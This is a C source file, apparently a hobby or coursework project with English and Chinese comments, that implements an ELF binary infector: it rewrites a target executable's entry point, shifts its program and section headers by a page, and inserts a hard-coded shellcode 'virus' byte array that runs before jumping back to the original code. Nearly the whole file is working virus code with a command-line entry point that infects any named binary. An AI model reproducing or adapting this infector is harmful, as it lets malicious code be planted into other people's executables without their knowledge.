#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <elf.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <string.h>

//Define PAGESIZE,default 4K byte
#define PAGESIZE 4096
int infect(char *ElfFile);
void workOutAddr(int value, int arr[]);

void workOutAddr(int value, int arr[])
{
    int a = value / (16 * 16);
    int b = value % (16 * 16);
    int a2 = a / (16 * 16);
    int b2 = a % (16 * 16);

    arr[0] = b;
    arr[1] = b2;
    arr[2] = a2;
}

//Infector Function
int infect(char *ElfFile)
{
    int result = 0;
    int Re;
    int FileD;
    int TmpD;
    int OldEntry;
    int OldShoff;
    int OldPhsize;
    int i = 0;

    // ELF Header Table 结构体
    Elf64_Ehdr elfh;
    // Program Header Table 结构体
    Elf64_Phdr Phdr;
    // Section Header Table 结构体
    Elf64_Shdr Shdr;

    //Open ELF file and read the elf header part to &elfh
    FileD = open(ElfFile, O_RDWR);
    read(FileD, &elfh, sizeof(elfh));
    if ((strncmp(elfh.e_ident, ELFMAG, SELFMAG)) != 0)
        exit(0);

    //Old entry of original elf file
    OldEntry = elfh.e_entry;
    //Old section header offset of elf file
    OldShoff = elfh.e_shoff;

    //Parasite Virus Code.The code is copied from Internet.
    char Virus[] = {
        0x50,
        0x53,
        0x51,
        0x52,
        0x48, 0xc7, 0xc0, 0x08, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc3, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc1, 0xa4, 0x01, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0x89, 0xc3,
        0x48, 0xc7, 0xc0, 0x04, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc1, 0x00, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0xc7, 0xc0, 0x06, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x5a,
        0x59,
        0x5b,
        0x58,
        //跳转指令
        0xbd, 0x00, 0x00, 0x00, 0x00, 0xff, 0xe5,
        //数据区域
        0x68, 0x68, 0x68, 0x68, 0x68, 0x00};
    //The size of Virus Code
    int VirusSize = sizeof(Virus);

    //Increase e_shoff by PAGESIZE in the ELF header
    elfh.e_shoff += PAGESIZE;

    //if Virus Size is too large
    if (VirusSize > (PAGESIZE - (elfh.e_entry % PAGESIZE)))
        exit(0);

    int Noff = 0;

    //The loop of read and modify program header
    for (i = 0; i < elfh.e_phnum; i++)
    {
        //seek and read to &Phdr
        lseek(FileD, elfh.e_phoff + i * elfh.e_phentsize, SEEK_SET);
        read(FileD, &Phdr, sizeof(Phdr));
        if (Noff)
        {
            //For each phdr who's segment is after the insertion (text segment)
            //increase p_offset by PAGESIZE
            Phdr.p_offset += PAGESIZE;

            //write back
            lseek(FileD, elfh.e_phoff + i * elfh.e_phentsize, SEEK_SET);
            write(FileD, &Phdr, sizeof(Phdr));
        }
        else if (PT_LOAD == Phdr.p_type && Phdr.p_offset == 0)
        {
            if (Phdr.p_filesz != Phdr.p_memsz)
                exit(0);
            // Locate the text segment program header
            //Modify the entry point of the ELF header to point to the new
            //code (p_vaddr + p_filesz)
            elfh.e_entry = Phdr.p_vaddr + Phdr.p_filesz;
            lseek(FileD, 0, SEEK_SET);

            //Write back the new elf header
            write(FileD, &elfh, sizeof(elfh));
            OldPhsize = Phdr.p_filesz;
            Noff = Phdr.p_offset + Phdr.p_filesz;

            //Increase p_filesz by account for the new code (parasite)
            Phdr.p_filesz += VirusSize;

            //Increase p_memsz to account for the new code (parasite)
            Phdr.p_memsz += VirusSize;

            //write back the program header
            lseek(FileD, elfh.e_phoff + i * elfh.e_phentsize, SEEK_SET);
            write(FileD, &Phdr, sizeof(Phdr));
        }
    }
    lseek(FileD, OldShoff, SEEK_SET);

    Elf64_Addr new_entry;
    //The loop of read and modify the section header
    for (i = 0; i < elfh.e_shnum; i++)
    {
        lseek(FileD, i * sizeof(Shdr) + OldShoff, SEEK_SET);
        Re = read(FileD, &Shdr, sizeof(Shdr));
        if (i == 1)
        {
            //For the last shdr in the text segment
            //increase sh_size by the virus size
            Shdr.sh_size += VirusSize;
        }
        else if (i != 0)
        {
            //For each shdr whoes section resides after the insertion
            //increase sh_offset by PAGESIZE
            Shdr.sh_offset += PAGESIZE;
        }

        //Write Back
        lseek(FileD, OldShoff + i * sizeof(Shdr), SEEK_SET);
        write(FileD, &Shdr, sizeof(Shdr));
    }

    //modify the Virus code line"movl "Oldentry",%eax" to jump to old entry
    //after the Virus code excuted
    //需要修改跳转指令中的目的地址为原入口地址
    int ori_arr[3];
    workOutAddr(OldEntry, ori_arr);

    //计算出数据的地址,扔到将插入的代码中
    int dataEntry = elfh.e_entry + 73;
    int data_arr[3];
    workOutAddr(dataEntry, data_arr);
    //Parasite Virus Code.The code is copied from Internet.
    char Virus_new[] = {
        0x50,
        0x53,
        0x51,
        0x52,
        0x48, 0xc7, 0xc0, 0x08, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc3, data_arr[0], data_arr[1], data_arr[2], 0x00,
        0x48, 0xc7, 0xc1, 0xa4, 0x01, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0x89, 0xc3,
        0x48, 0xc7, 0xc0, 0x04, 0x00, 0x00, 0x00,
        0x48, 0xc7, 0xc1, data_arr[0], data_arr[1], data_arr[2], 0x00,
        0x48, 0xc7, 0xc2, 0x05, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x48, 0xc7, 0xc0, 0x06, 0x00, 0x00, 0x00,
        0xcd, 0x80,
        0x5a,
        0x59,
        0x5b,
        0x58,
        //跳转指令
        0xbd, ori_arr[0], ori_arr[1], ori_arr[2], 0x00, 0xff, 0xe5,
        //数据区域
        0x68, 0x68, 0x68, 0x68, 0x68, 0x00};

    //To get the file size FileStat.st_size
    struct stat FileStat;
    fstat(FileD, &FileStat);

    char *Data = NULL;
    Data = (char *)malloc(FileStat.st_size - OldPhsize);

    lseek(FileD, OldPhsize, SEEK_SET);
    read(FileD, Data, FileStat.st_size - OldPhsize);

    //Insert the Virus Code to the elf file
    lseek(FileD, OldPhsize, SEEK_SET);
    write(FileD, Virus_new, sizeof(Virus_new));

    char tmp[PAGESIZE] = {0};
    //Pad to PAGESIZE
    memset(tmp, PAGESIZE - VirusSize, 0);
    write(FileD, tmp, PAGESIZE - VirusSize);

    write(FileD, Data, FileStat.st_size - OldPhsize);
    result = 1;

    free(Data);
    return result;
}

//Just for test
int main(int argc, char **argv)
{
    //How to use it
    if (argc != 2)
    {
        printf("Usage : infect <ELF filename>\n");
        exit(0);
    }

    int test = infect(argv[1]);
    if (test != 1)
    {
        exit(0);
    }
    return 0;
}

